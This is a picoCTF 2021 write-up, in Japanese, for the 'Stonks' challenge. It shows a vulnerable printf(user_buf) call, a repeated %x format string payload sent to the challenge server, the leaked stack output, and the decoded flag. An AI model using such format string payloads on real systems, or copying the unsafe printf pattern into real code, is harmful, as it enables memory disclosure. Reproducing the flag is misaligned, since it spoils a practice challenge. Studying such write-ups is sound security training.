# Stonks:Binary Exploitation

I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! \
[vuln.c](https://github.com/colza12/ctf_writeup/blob/main/picoCTF%202021/Stonks/vuln.c) `nc mercury.picoctf.net 33411`

# Solution

とりあえずプロンプトに`nc mercury.picoctf.net 33411`をなげてみる。
```
$ nc mercury.picoctf.net 33411
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
1
Buying stonks with token:
1
Portfolio as of Fri Apr 26 02:07:58 UTC 2024


1 shares of VP
2 shares of YCWC
14 shares of VJMP
5 shares of NZIO
44 shares of SFO
87 shares of YR
154 shares of ZRZ
796 shares of CIJD
5 shares of EXT
Goodbye!
```
株を買うor状態を見ることができるらしい。添付のプログラムを見てみると、
flagはapi_bufに格納されているっぽい。それから以下の部分で何かしらできそう。
```
	// TODO: Figure out how to read token from file, for now just ask

	char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);

	// TODO: Actually use key to interact with API
 ```
 user_bufを表示してくれるみたいなので、とりあえずAPI tokenを聞かれるところで`%x`を入力してみる。と、なんか出てきた。
 ```
 Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x
Buying stonks with token:
9e4d3f0
Portfolio as of Fri Apr 26 02:13:52 UTC 2024


1 shares of SSY
10 shares of QTK
2 shares of VMZ
90 shares of V
360 shares of H
141 shares of JM
38 shares of THL
1180 shares of WCF
Goodbye!
```
`%x`をたくさん並べてみればflagが見られるかも。
```
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
Buying stonks with token:
95843b0804b00080489c3f7f17d80ffffffff19582160f7f25110f7f17dc7095831801958439095843b06f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6334326136613431ffe5007df7f52af8f7f254401ec2430010f7db4ce9
Portfolio as of Fri Apr 26 01:54:28 UTC 2024


1 shares of LV
1 shares of WD
27 shares of E
188 shares of OXJ
70 shares of AC
1189 shares of QYXJ
Goodbye
```
出てきた怪しげな謎文字列をhex→UTF-8にすると、\
![image.png](https://github.com/colza12/ctf_writeup/blob/main/picoCTF%202021/Stonks/image/capture.png)\
4文字ずつ逆になっているflag(リトルエンディアンで記述されている)が出てきたので、並べ替える。

`picoCTF{I_l05t_4ll_my_m0n3y_a24c14a6}`

ちなみに、Format String Attack(書式文字列攻撃)という、printf()などの関数の引数の特性を利用した攻撃方法らしい。
